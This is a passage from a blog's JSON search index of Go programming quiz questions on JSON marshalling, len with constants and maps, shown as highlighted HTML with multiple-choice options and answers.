style=\"color:#e6db74\"\u003e`json:\u0026#34;child\u0026#34;`\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ejsonStr1\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e`{\u0026#34;age\u0026#34;: 14,\u0026#34;name\u0026#34;: \u0026#34;potter\u0026#34;, \u0026#34;child\u0026#34;:[1,2,3]}`\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ea\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eAutoGenerated\u003c/span\u003e{}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ejson\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eUnmarshal\u003c/span\u003e([]byte(\u003cspan style=\"color:#a6e22e\"\u003ejsonStr1\u003c/span\u003e), \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003ea\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003eaa\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ea\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eChild\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eaa\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ejsonStr2\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e`{\u0026#34;age\u0026#34;: 12,\u0026#34;name\u0026#34;: \u0026#34;potter\u0026#34;, \u0026#34;child\u0026#34;:[3,4,5,7,8,9]}`\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ejson\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eUnmarshal\u003c/span\u003e([]byte(\u003cspan style=\"color:#a6e22e\"\u003ejsonStr2\u003c/span\u003e), \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003ea\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eaa\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eA. [1 2 3] [1 2 3]\u003c/li\u003e\n\u003cli\u003eB. [1 2 3] [3 4 5]\u003c/li\u003e\n\u003cli\u003eC. [1 2 3] [3 4 5 6 7 8 9]\u003c/li\u003e\n\u003cli\u003eD. [1 2 3] [3 4 5 0 0 0]\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdetails\u003e\n\u003csummary\u003eAnswer\u003c/summary\u003e\n\u003cpre\u003e\u003ca href=\"https://go.dev/play/p/BRdAwDKfZt4\" target=\"_blank\"\u003eTry it\u003c/a\u003e\n\u003ccode\u003eB\n\u003c/code\u003e\u003c/pre\u003e\u003c/details\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003ejson1\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e (\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;encoding/json\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;time\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003et\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003estruct\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003etime\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eTime\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003eN\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}{\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003etime\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eDate\u003c/span\u003e(\u003cspan style=\"color:#ae81ff\"\u003e2020\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e12\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e20\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003etime\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eUTC\u003c/span\u003e),\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#ae81ff\"\u003e5\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003em\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003e_\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ejson\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eMarshal\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003et\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;%s\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003em\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eA. {\u0026ldquo;Time\u0026rdquo;:\u0026ldquo;2020-12-20T00:00:00Z\u0026rdquo;,\u0026ldquo;N\u0026rdquo;:5}\u003c/li\u003e\n\u003cli\u003eB. \u0026ldquo;2020-12-20T00:00:00Z\u0026rdquo;\u003c/li\u003e\n\u003cli\u003eC. {\u0026ldquo;N\u0026rdquo;:5}\u003c/li\u003e\n\u003cli\u003eD. \u003ccode\u003e\u0026lt;nil\u0026gt;\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eE. 其他\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdetails\u003e\n\u003csummary\u003eAnswer\u003c/summary\u003e\n\u003cpre\u003e\u003ca href=\"https://go.dev/play/p/ylPvSph0WKu\" target=\"_blank\"\u003eTry it\u003c/a\u003e\n\u003ccode\u003eB\n\u003c/code\u003e\u003c/pre\u003e\u003c/details\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e","tags":null,"title":"JSON"},{"categories":null,"contents":" len package main func main() { var x *struct { s [][32]byte } println(len(x.s[99])) } A. panic B. compilation error C. 32 D. 0 Answer Try it C len1 package main const s = \u0026#34;Go101.org\u0026#34; // len(s) == 9 // 1 \u0026lt;\u0026lt; 9 == 512 // 512 / 128 == 4 var a byte = 1 \u0026lt;\u0026lt; len(s) / 128 var b byte = 1 \u0026lt;\u0026lt; len(s[:]) / 128 func main() { println(a, b) } A: 0 0 B: 0 4 C: 4 0 D: 4 4 Answer Try it C len2 package main var s = \u0026#34;Go101.org\u0026#34; // len(s) == 9 // 1 \u0026lt;\u0026lt; 9 == 512 // 512 / 128 == 4 var a byte = 1 \u0026lt;\u0026lt; len(s) / 128 var b byte = 1 \u0026lt;\u0026lt; len(s[:]) / 128 func main() { println(a, b) } A: 0 0 B: 0 4 C: 4 0 D: 4 4 Answer Try it A ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/notes/go/questions/len/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003elen\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ex\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003estruct\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003es\u003c/span\u003e [][\u003cspan style=\"color:#ae81ff\"\u003e32\u003c/span\u003e]\u003cspan style=\"color:#66d9ef\"\u003ebyte\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\tprintln(len(\u003cspan style=\"color:#a6e22e\"\u003ex\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003es\u003c/span\u003e[\u003cspan style=\"color:#ae81ff\"\u003e99\u003c/span\u003e]))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eA. panic\u003c/li\u003e\n\u003cli\u003eB. compilation error\u003c/li\u003e\n\u003cli\u003eC. 32\u003c/li\u003e\n\u003cli\u003eD. 0\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdetails\u003e\n\u003csummary\u003eAnswer\u003c/summary\u003e\n\u003cpre\u003e\u003ca href=\"https://go.dev/play/p/5JSJUg9DlVm\" target=\"_blank\"\u003eTry it\u003c/a\u003e\n\u003ccode\u003eC\n\u003c/code\u003e\u003c/pre\u003e\u003c/details\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003elen1\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003econst\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003es\u003c/span\u003e = \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Go101.org\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e// len(s) == 9\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e// 1 \u0026lt;\u0026lt; 9 == 512\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e// 512 / 128 == 4\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ea\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003ebyte\u003c/span\u003e = \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026lt;\u0026lt;\u003c/span\u003e len(\u003cspan style=\"color:#a6e22e\"\u003es\u003c/span\u003e) \u003cspan style=\"color:#f92672\"\u003e/\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e128\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eb\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003ebyte\u003c/span\u003e = \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026lt;\u0026lt;\u003c/span\u003e len(\u003cspan style=\"color:#a6e22e\"\u003es\u003c/span\u003e[:]) \u003cspan style=\"color:#f92672\"\u003e/\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e128\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\tprintln(\u003cspan style=\"color:#a6e22e\"\u003ea\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eb\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eA: 0 0\u003c/li\u003e\n\u003cli\u003eB: 0 4\u003c/li\u003e\n\u003cli\u003eC: 4 0\u003c/li\u003e\n\u003cli\u003eD: 4 4\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdetails\u003e\n\u003csummary\u003eAnswer\u003c/summary\u003e\n\u003cpre\u003e\u003ca href=\"https://go.dev/play/p/TqAKcTqRFDo\" target=\"_blank\"\u003eTry it\u003c/a\u003e\n\u003ccode\u003eC\n\u003c/code\u003e\u003c/pre\u003e\u003c/details\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003elen2\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003es\u003c/span\u003e = \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Go101.org\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e// len(s) == 9\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e// 1 \u0026lt;\u0026lt; 9 == 512\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e// 512 / 128 == 4\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ea\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003ebyte\u003c/span\u003e = \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026lt;\u0026lt;\u003c/span\u003e len(\u003cspan style=\"color:#a6e22e\"\u003es\u003c/span\u003e) \u003cspan style=\"color:#f92672\"\u003e/\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e128\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eb\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003ebyte\u003c/span\u003e = \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026lt;\u0026lt;\u003c/span\u003e len(\u003cspan style=\"color:#a6e22e\"\u003es\u003c/span\u003e[:]) \u003cspan style=\"color:#f92672\"\u003e/\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e128\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\tprintln(\u003cspan style=\"color:#a6e22e\"\u003ea\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eb\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eA: 0 0\u003c/li\u003e\n\u003cli\u003eB: 0 4\u003c/li\u003e\n\u003cli\u003eC: 4 0\u003c/li\u003e\n\u003cli\u003eD: 4 4\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdetails\u003e\n\u003csummary\u003eAnswer\u003c/summary\u003e\n\u003cpre\u003e\u003ca href=\"https://go.dev/play/p/BGB-z-cJhP2\" target=\"_blank\"\u003eTry it\u003c/a\u003e\n\u003ccode\u003eA\n\u003c/code\u003e\u003c/pre\u003e\u003c/details\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e","tags":null,"title":"Len"},{"categories":null,"contents":" map package main import \u0026#34;fmt\u0026#34; type Student struct { Name string } var list map[string]Student func main() { list = make(map[string]Student) student := Student{\u0026#34;Aceld\u0026#34;} list[\u0026#34;student\u0026#34;] = student list[\u0026#34;student\u0026#34;].Name = \u0026#34;LDB\u0026#34; fmt.Println(list[\u0026#34;student\u0026#34;]) } Answer Try it compilation error cannot assign to struct field list[\"student\"].Name in map map1 package main func main() { m := make(map[int]int, 3) x := len(m) m[1] = m[1] y := len(m) println(x, y) } Answer Try it 0 1 ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/notes/go/questions/map/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003emap\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003etype\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eStudent\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003estruct\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#a6e22e\"\u003eName\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003estring\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003elist\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003emap\u003c/span\u003e[\u003cspan style=\"color:#66d9ef\"\u003estring\u003c/span\u003e]\u003cspan style=\"color:#a6e22e\"\u003eStudent\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003elist\u003c/span\u003e = make(\u003cspan style=\"color:#66d9ef\"\u003emap\u003c/span\u003e[\u003cspan style=\"color:#66d9ef\"\u003estring\u003c/span\u003e]\u003cspan style=\"color:#a6e22e\"\u003eStudent\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003estudent\u003c/span\u003e \u003cspan 